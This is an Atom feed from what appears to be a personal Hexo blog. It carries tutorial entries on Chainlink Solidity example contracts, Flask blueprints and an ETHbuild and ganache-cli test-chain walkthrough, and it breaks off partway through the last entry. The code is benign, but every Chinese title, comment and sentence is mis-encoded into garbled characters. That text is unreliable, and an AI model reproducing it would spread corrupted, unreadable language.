<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XiaoYue</title>
  
  <subtitle>ä»¥æ¢¦ä¸ºé©¬,ä¸è´ŸéŸ¶å</subtitle>
  <link href="https://x1a0.net/atom.xml" rel="self"/>
  
  <link href="https://x1a0.net/"/>
  <updated>2021-12-07T05:36:35.934Z</updated>
  <id>https://x1a0.net/</id>
  
  <author>
    <name>è‚–è¶Š</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>chainlinkå­¦ä¹ å°è®°</title>
    <link href="https://x1a0.net/2021/12/07/chainlink%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/"/>
    <id>https://x1a0.net/2021/12/07/chainlink%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/</id>
    <published>2021-12-07T03:04:41.000Z</published>
    <updated>2021-12-07T05:36:35.934Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract PriceConsumerV3 &#123;</span><br><span class="line"></span><br><span class="line">    AggregatorV3Interface internal priceFeed;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        <span class="comment">// å–‚ä»·åˆçº¦åœ°å€</span></span><br><span class="line">        priceFeed = AggregatorV3Interface(<span class="number">0x9326BFA02ADD2366b30bacB125260Af641031331</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è·å–æœ€åä¸€è½®ä»·æ ¼</span></span><br><span class="line">    <span class="function">function <span class="title">getLatestPrice</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(<span class="keyword">int</span>)</span> </span>&#123;</span><br><span class="line">        (</span><br><span class="line">            uint80 roundID, </span><br><span class="line">            <span class="keyword">int</span> price,</span><br><span class="line">            uint startedAt,</span><br><span class="line">            uint timeStamp,</span><br><span class="line">            uint80 answeredInRound</span><br><span class="line">        ) = priceFeed.latestRoundData();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/VRFConsumerBase.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract RandomNumberConsumer is VRFConsumerBase &#123;</span><br><span class="line">    </span><br><span class="line">    bytes32 internal keyHash;</span><br><span class="line">    uint256 internal fee;</span><br><span class="line">    </span><br><span class="line">    uint256 <span class="keyword">public</span> randomResult;</span><br><span class="line">    bytes32 <span class="keyword">public</span> resultId;</span><br><span class="line"></span><br><span class="line">    constructor() </span><br><span class="line">        VRFConsumerBase(</span><br><span class="line">            <span class="number">0xdD3782915140c8f3b190B5D67eAc6dc5760C46E9</span>, <span class="comment">// VRF Coordinator</span></span><br><span class="line">            <span class="number">0xa36085F69e2889c224210F603D836748e7dC0088</span>  <span class="comment">// LINK Token</span></span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        keyHash = <span class="number">0x6c3699283bda56ad74f6b855546325b68d482e983852a7a82979cc4807b641f4</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// 0.1 LINK (Varies by network)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¯·æ±‚å‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">getRandomNumber</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span>&#123;</span><br><span class="line">        require(LINK.balanceOf(address(<span class="keyword">this</span>)) &gt;= fee, <span class="string">&quot;Not enough LINK - fill contract with faucet&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> requestRandomness(keyHash, fee);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å›è°ƒå‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">fulfillRandomness</span><span class="params">(bytes32 requestId, uint256 randomness)</span> internal override </span>&#123;</span><br><span class="line">        randomResult = randomness;</span><br><span class="line">        resultId = requestId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity <span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/VRFConsumerBase.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ConfirmedOwner.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract VRFD20 is VRFConsumerBase, ConfirmedOwner(msg.sender) &#123;</span><br><span class="line">    uint256 <span class="keyword">private</span> constant ROLL_IN_PROGRESS = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰å…¬é’¥å’Œè·å–éšæœºæ•°éœ€è¦çš„è´¹ç”¨</span></span><br><span class="line">    bytes32 <span class="keyword">private</span> s_keyHash;</span><br><span class="line">    uint256 <span class="keyword">private</span> s_fee;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// requestIDå’Œåœ°å€ä¹‹é—´çš„æ˜ å°„ å’Œ åœ°å€å’Œéª°å­å€¼ä¹‹é—´çš„æ˜ å°„</span></span><br><span class="line">    mapping(bytes32 =&gt; address) <span class="keyword">private</span> s_rollers;</span><br><span class="line">    mapping(address =&gt; uint256) <span class="keyword">private</span> s_results;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éšæœºæ•°è¿”å›äº‹ä»¶ éšæœºæ•°ä¸­requestIDå’Œåœ°å€ç»‘å®šäº‹ä»¶</span></span><br><span class="line">    <span class="function">event <span class="title">DiceRolled</span><span class="params">(bytes32 indexed requestId, address indexed roller)</span></span>;</span><br><span class="line">    <span class="function">event <span class="title">DiceLanded</span><span class="params">(bytes32 indexed requestId, uint256 indexed result)</span></span>;</span><br><span class="line"></span><br><span class="line">    constructor(address vrfCoordinator, address link, bytes32 keyHash, uint256 fee)</span><br><span class="line">        VRFConsumerBase(vrfCoordinator, link)</span><br><span class="line">    &#123;</span><br><span class="line">        s_keyHash = keyHash;</span><br><span class="line">        s_fee = fee;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ·éª°å­</span></span><br><span class="line">    <span class="function">function <span class="title">rollDice</span><span class="params">(address roller)</span> <span class="keyword">public</span> onlyOwner <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span>&#123;</span><br><span class="line">        require(LINK.balanceOf(address(<span class="keyword">this</span>)) &gt;= s_fee, <span class="string">&quot;Not enough LINK to pay fee&quot;</span>);</span><br><span class="line">        require(s_results[roller] == <span class="number">0</span>, <span class="string">&quot;Already rolled&quot;</span>);</span><br><span class="line">        requestId = requestRandomness(s_keyHash, s_fee);</span><br><span class="line">        s_rollers[requestId] = roller;</span><br><span class="line">        <span class="comment">//å¦‚æœæ˜¯roll_in_progresså°±è¯´æ˜æ²¡æœ‰æ·æˆåŠŸ</span></span><br><span class="line">        s_results[roller] = ROLL_IN_PROGRESS;</span><br><span class="line">        <span class="function">emit <span class="title">DiceRolled</span><span class="params">(requestId, roller)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å›è°ƒå‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">fulfillRandomness</span><span class="params">(bytes32 requestId, uint256 randomness)</span> internal override </span>&#123;</span><br><span class="line">        uint256 d20Value = (randomness % <span class="number">20</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//callbackæ›´æ–°roll_in_progressï¼Œé€šè¿‡s_rollersæ‰¾åˆ°addressï¼Œé€šè¿‡addressè®¾ç½®éª°å­è¿”å›å€¼</span></span><br><span class="line">        s_results[s_rollers[requestId]] = d20Value;</span><br><span class="line">        <span class="function">emit <span class="title">DiceLanded</span><span class="params">(requestId, d20Value)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">house</span><span class="params">(address player)</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        require(s_results[player] != <span class="number">0</span>, <span class="string">&quot;Dice not rolled&quot;</span>);</span><br><span class="line">        require(s_results[player] != ROLL_IN_PROGRESS, <span class="string">&quot;Roll in progress&quot;</span>);</span><br><span class="line">        <span class="comment">// é€šè¿‡åœ°å€è·å–éšæœºæ•°ï¼Œåˆ†é…æˆ¿å­</span></span><br><span class="line">        <span class="keyword">return</span> getHouseName(s_results[player]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è½¬å‡ºlinkå‡½æ•°</span></span><br><span class="line">    <span class="function">function <span class="title">withdrawLINK</span><span class="params">(address to, uint256 value)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        require(LINK.transfer(to, value), <span class="string">&quot;Not enough LINK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setKeyHash</span><span class="params">(bytes32 keyHash)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        s_keyHash = keyHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">keyHash</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(bytes32)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_keyHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">setFee</span><span class="params">(uint256 fee)</span> <span class="keyword">public</span> onlyOwner </span>&#123;</span><br><span class="line">        s_fee = fee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">fee</span><span class="params">()</span> <span class="keyword">public</span> view <span class="title">returns</span> <span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_fee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">getHouseName</span><span class="params">(uint256 id)</span> <span class="keyword">private</span> pure <span class="title">returns</span> <span class="params">(string memory)</span> </span>&#123;</span><br><span class="line">        string[<span class="number">20</span>] memory houseNames = [</span><br><span class="line">            <span class="string">&quot;Targaryen&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Lannister&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Stark&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tyrell&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Baratheon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Martell&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tully&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Bolton&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Greyjoy&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Arryn&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Frey&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Mormont&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Tarley&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Dayne&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Umber&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Valeryon&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Manderly&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Clegane&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Glover&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Karstark&quot;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">return</span> houseNames[id - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@chainlink/contracts/src/v0.8/ChainlinkClient.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract APIConsumer is ChainlinkClient &#123;</span><br><span class="line">    using Chainlink <span class="keyword">for</span> Chainlink.Request;</span><br><span class="line">  </span><br><span class="line">    uint256 <span class="keyword">public</span> volume;</span><br><span class="line">    </span><br><span class="line">    address <span class="keyword">private</span> oracle;</span><br><span class="line">    bytes32 <span class="keyword">private</span> jobId;</span><br><span class="line">    uint256 <span class="keyword">private</span> fee;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        setPublicChainlinkToken();</span><br><span class="line">        oracle = <span class="number">0xc57B33452b4F7BB189bB5AfaE9cc4aBa1f7a4FD8</span>;</span><br><span class="line">        jobId = <span class="string">&quot;d5270d1c311941d0b08bead21fea7747&quot;</span>;</span><br><span class="line">        fee = <span class="number">0.1</span> * <span class="number">10</span> ** <span class="number">18</span>; <span class="comment">// (Varies by network and job)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">requestVolumeData</span><span class="params">()</span> <span class="keyword">public</span> <span class="title">returns</span> <span class="params">(bytes32 requestId)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Chainlink.Request memory request = buildChainlinkRequest(jobId, address(<span class="keyword">this</span>), <span class="keyword">this</span>.fulfill.selector);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;get&quot;</span>, <span class="string">&quot;https://min-api.cryptocompare.com/data/pricemultifull?fsyms=ETH&amp;tsyms=USD&quot;</span>);</span><br><span class="line"></span><br><span class="line">        request.add(<span class="string">&quot;path&quot;</span>, <span class="string">&quot;RAW.ETH.USD.OPENHOUR&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sendChainlinkRequestTo(oracle, request, fee);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">function <span class="title">fulfill</span><span class="params">(bytes32 _requestId, uint256 _volume)</span> <span class="keyword">public</span> <span class="title">recordChainlinkFulfillment</span><span class="params">(_requestId)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        volume = _volume;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="Solidity" scheme="https://x1a0.net/categories/Solidity/"/>
    
    
    <category term="åŒºå—é“¾" scheme="https://x1a0.net/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    <category term="solidity" scheme="https://x1a0.net/tags/solidity/"/>
    
    <category term="chainlink" scheme="https://x1a0.net/tags/chainlink/"/>
    
  </entry>
  
  <entry>
    <title>flaskè“å›¾é€šä¿—æ˜“æ‡‚çš„ç†è§£</title>
    <link href="https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://x1a0.net/2021/11/25/flask%E8%93%9D%E5%9B%BE%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2021-11-25T14:33:17.000Z</published>
    <updated>2021-11-25T14:39:36.016Z</updated>
    
    <content type="html"><![CDATA[<p>æ–°å»ºä¸€ä¸ª<code>test1.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> test2 <span class="keyword">import</span> lantu2</span><br><span class="line"></span><br><span class="line">test1 = Flask(__name__)</span><br><span class="line">test1.register_blueprint(lantu2)</span><br><span class="line"></span><br><span class="line">test1.run(port=<span class="number">5001</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å†å»ºä¸€ä¸ª<code>test2.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint</span><br><span class="line">lantu2 = Blueprint(<span class="string">&quot;dsfsdfasdfadfasdf&quot;</span>,__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@lantu2.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lantu</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xiaoyue&quot;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è“å›¾å°±æ˜¯åŸæ¥app.pyå¤šäº†ä¸¤è¡Œä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from éšä¾¿ä¸€ä¸ªé¡µé¢ import è“å›¾</span><br><span class="line">app.register_blueprint(è“å›¾)</span><br></pre></td></tr></table></figure><p>è€Œåè“å›¾ä¸­åªè¦å¯¼å…¥Blueprintå°±å’Œæ™®é€šapp.pyä¸€æ ·å†™è·¯ç”±åŠ åŠŸèƒ½å°±è¡Œäº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ–°å»ºä¸€ä¸ª&lt;code&gt;test1.py&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cl</summary>
      
    
    
    
    <category term="Python" scheme="https://x1a0.net/categories/Python/"/>
    
    <category term="Flask" scheme="https://x1a0.net/categories/Flask/"/>
    
    
    <category term="Python" scheme="https://x1a0.net/tags/Python/"/>
    
    <category term="flask" scheme="https://x1a0.net/tags/flask/"/>
    
    <category term="è“å›¾" scheme="https://x1a0.net/tags/%E8%93%9D%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>ETHbuild-é›¶ä»£ç å…¥é—¨åˆçº¦å¼€å‘</title>
    <link href="https://x1a0.net/2021/11/15/ETHbuild-%E9%9B%B6%E4%BB%A3%E7%A0%81%E5%85%A5%E9%97%A8%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    <id>https://x1a0.net/2021/11/15/ETHbuild-%E9%9B%B6%E4%BB%A3%E7%A0%81%E5%85%A5%E9%97%A8%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/</id>
    <published>2021-11-15T12:05:45.000Z</published>
    <updated>2021-11-15T13:22:37.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç¥å¥‡çš„sandbox-eth-build"><a href="#ç¥å¥‡çš„sandbox-eth-build" class="headerlink" title="ç¥å¥‡çš„sandbox.eth.build"></a>ç¥å¥‡çš„sandbox.eth.build</h2><p>ä¸€ä¸ªæ —å­ğŸŒ°:<br><a href="https://eth.build/build#9279763e02828519b2edf8bdcd035d0961bcea07ed803fb13e3cfd178db9cc2c">ã€ŒETHbuildã€</a></p><h2 id="ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾"><a href="#ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾" class="headerlink" title="ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾"></a>ä½¿ç”¨ganache-cliåˆ›å»ºæµ‹è¯•é“¾</h2><p>å¦‚æœä½ æœ‰é’±æˆ–è€…æœ‰è¶³å¤Ÿçš„æ—¶é—´å»è·Ÿæ°´é¾™å¤´è¦æµ‹è¯•å¸ï¼Œå½“ç„¶ï¼Œä½ å¯ä»¥è·³è¿‡è¿™ä¸ªæ­¥éª¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ganache-cli</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ååº”è¯¥åƒè¿™æ ·ï¼š</p><p><img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.13.19.png"></p><p>å¦‚æœä½ æ²¡æœ‰ganacheï¼Œé‚£ä¹ˆä½ å¯èƒ½éœ€è¦ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cnpm -g install ganache-cli</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">npm -g install ganache-cli</span><br></pre></td></tr></table></figure><h2 id="æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—"><a href="#æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—" class="headerlink" title="æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—"></a>æ›´æ”¹ğŸŒ°ä¸­çš„chainæ¨¡å—</h2><ul><li><p>ç¬¬ä¸€ä¸ªchainæ¨¡å—åœ¨ä¸»é¡µï¼Œè¿æ¥ç€contractçš„blockchainã€‚  <img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.21.40.png"></p></li><li><p>ç¬¬äºŒä¸ªchainåœ¨walletä¸‹ (<strong>åŒå‡»walletè¿›å…¥è¯¥æ¨¡å—</strong>) ï¼Œä¹Ÿå¯ä»¥è¿æ¥inputè¿‡æ¥çš„chainã€‚æˆ‘åœ¨è¿™é‡Œæµ‹è¯•æ˜¯å¦è¿æ¥é“¾æˆåŠŸã€‚ï¼ˆå³è¾¹ä¼šæ˜¾ç¤ºä½™é¢ï¼‰<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.27.30.png"></p></li></ul><h2 id="å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼"><a href="#å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼" class="headerlink" title="å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼"></a>å¡«å…¥ç§é’¥ï¼Œåšä¸€ä¸ªæ‹¥æœ‰100ETHçš„å¯Œè±ªå§ï¼</h2><ul><li><p>å¯åŠ¨å¥½ganacheæˆ‘ä»¬ä¼šæ‹¥æœ‰10ä¸ªåœ°å€ï¼Œæ¯ä¸ªåœ°å€æ‹¥æœ‰100ä¸ªETHã€‚ç°åœ¨éšæœºé€‰å–ä¸€ä¸ªç§é’¥å¡«å…¥walletä¸‹çš„private key inputç«¯å£ã€‚<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.33.45.png"></p></li><li><p>åŒæ ·åœ¨walletæ¨¡å—ä¸‹å°±èƒ½æŸ¥çœ‹åˆ°ä½™é¢äº†!wowï¼Œ473288$!<img src="https://xiaoyue-blog.oss-cn-hangzhou.aliyuncs.com/html-class-pcl%5D/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%888.35.43.png"></p></li></ul><h2 id="éƒ¨ç½²åˆçº¦"><a 